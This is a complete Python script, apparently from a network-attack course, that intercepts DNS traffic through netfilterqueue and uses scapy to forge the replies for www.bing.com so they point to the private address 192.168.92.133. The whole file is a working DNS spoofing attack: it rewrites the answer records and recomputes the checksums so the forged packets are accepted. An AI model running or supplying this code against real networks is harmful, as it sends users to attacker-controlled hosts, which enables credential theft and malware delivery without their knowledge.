#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname.decode()
		if "www.bing.com" in qname:
			print("[+] Spoofing target..")
			print(scapy_packet.show())
			answer = scapy.DNSRR(rrname=qname, rdata="192.168.92.133")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			# Remove checksums and lengths to allow Scapy to recalculate them
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(bytes(scapy_packet))  # Convert packet to bytes and set as payload
			
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
